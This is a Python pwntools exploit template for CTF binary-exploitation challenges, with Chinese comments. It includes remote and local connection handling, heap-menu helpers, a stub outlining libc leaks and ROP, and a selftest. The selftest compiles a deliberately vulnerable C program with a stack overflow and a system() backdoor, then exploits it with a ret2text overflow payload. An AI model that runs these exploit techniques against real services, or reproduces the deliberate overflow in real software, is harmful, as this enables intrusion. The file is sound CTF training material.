# -*- coding: utf-8 -*-
# 脚本名称: pwntools 通用 EXP 模板（本地/远程一键切换 + 调试 + 自动 gdb.attach）
# 方向: Pwn（二进制利用）
# 简介: 标准化的 pwntools 利用骨架：自动识别本地/远程、libc 加载、
#       gdb 调试脚本注入、菜单堆题函数封装、接收超时与异常处理、
#       成功交互(interactive)判定。所有 Pwn 题都可从这个模板改。
# 用法:
#   python exp.py                  # 本地运行 ./pwn
#   python exp.py REMOTE 1.2.3.4 9999   # 远程
#   python exp.py GDB              # 本地 + gdb.attach 下断
#   python exp.py LIBC /path/libc.so.6  # 指定 libc
#   python exp.py --selftest       # 模板自检（编译一个有栈溢出的程序并打通）
# 依赖: pip install pwntools；本地利用需要 gdb/pwndbg（Linux/Kali/WSL）
# 参考: https://docs.pwntools.com/
from pwn import *

context(os="linux", arch="amd64", log_level="info")
# context.terminal = ["tmux", "splitw", "-h"]   # wsl/终端按需设置

ELF_PATH = "./pwn"
REMOTE_HOST, REMOTE_PORT = "127.0.0.1", 9999
LIBC_PATH = ""

# ----------------------------------------------------------------------
# 连接初始化（一般不用改）
# ----------------------------------------------------------------------
def start():
    elf = ELF(ELF_PATH, checksec=False)
    libc = ELF(LIBC_PATH, checksec=False) if LIBC_PATH else None
    args_list = [x for x in args if not x.isupper()]
    if args.REMOTE:
        host = args_list[0] if args_list else REMOTE_HOST
        port = int(args_list[1]) if len(args_list) > 1 else REMOTE_PORT
        io = remote(host, port)
    else:
        io = process(ELF_PATH)
        if args.GDB:
            gdb.attach(io, gdbscript="""
            b *main
            c
            """)
    return io, elf, libc


# ----------------------------------------------------------------------
# 堆题常用菜单封装（按题目菜单修改编号与提示）
# ----------------------------------------------------------------------
def add(io, idx, size, content):
    io.sendlineafter(b"choice:", b"1")
    io.sendlineafter(b"index:", str(idx).encode())
    io.sendlineafter(b"size:", str(size).encode())
    io.sendafter(b"content:", content)


def delete(io, idx):
    io.sendlineafter(b"choice:", b"2")
    io.sendlineafter(b"index:", str(idx).encode())


def show(io, idx):
    io.sendlineafter(b"choice:", b"3")
    io.sendlineafter(b"index:", str(idx).encode())
    return io.recvuntil(b"\n1.", drop=True)


def edit(io, idx, content):
    io.sendlineafter(b"choice:", b"4")
    io.sendlineafter(b"index:", str(idx).encode())
    io.sendafter(b"content:", content)


# ----------------------------------------------------------------------
# 利用主体
# ----------------------------------------------------------------------
def exploit():
    io, elf, libc = start()

    # TODO: 在这里写利用逻辑
    # 1. 泄露: io.sendline(...) / io.recvuntil / u64(recv(6).ljust(8,b'\x00'))
    # 2. 计算 libc 基址: libc.address = leak - libc.sym['puts'] - 0x...
    # 3. ROP: ROP(libc) -> ret2system / one_gadget / ret2execve
    payload = b"A" * 0x28 + p64(elf.sym.get("main", 0))
    # io.sendlineafter(b"input:", payload)

    io.interactive()


# ----------------------------------------------------------------------
# 自测：现场编译一个栈溢出程序并 ret2text 打通，验证模板链路可用
# ----------------------------------------------------------------------
def selftest():
    import os
    import sys
    if sys.platform != "linux":
        print("[-] 本自测需 Linux 环境（gcc 生成 ELF + pwntools），Windows/macOS 跳过")
        return
    import subprocess
    import tempfile
    d = tempfile.mkdtemp()
    src = os.path.join(d, "vuln.c")
    binp = os.path.join(d, "vuln")
    open(src, "w").write(r'''
#include <stdio.h>
#include <unistd.h>
void backdoor(){ system("echo SELFTEST_PWNED"); }
void vuln(){ char b[32]; read(0,b,200); }
int main(){ setvbuf(stdout,0,2,0); vuln(); return 0; }
''')
    try:
        cc = subprocess.run(["gcc", "-fno-stack-protector", "-no-pie", "-o", binp, src],
                            capture_output=True, text=True)
    except FileNotFoundError:
        print("[-] 需要 gcc（Linux/WSL/Kali），跳过编译自测"); return
    if cc.returncode != 0:
        print("[-] 需要 gcc（Linux/WSL/Kali），跳过编译自测:", cc.stderr[:200])
        return
    global ELF_PATH
    ELF_PATH = binp
    context(os="linux", arch="amd64", log_level="warning")
    io, elf, _ = start()
    backdoor = elf.sym["backdoor"]
    # 32 字节 buf + 8 rbp
    payload = b"A" * 40 + p64(backdoor)
    io.send(payload)
    data = io.recvall(timeout=5)
    assert b"SELFTEST_PWNED" in data, data
    print("[+] selftest OK，ret2text 打通:", data.strip().decode(errors="replace"))


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        selftest()
    else:
        exploit()
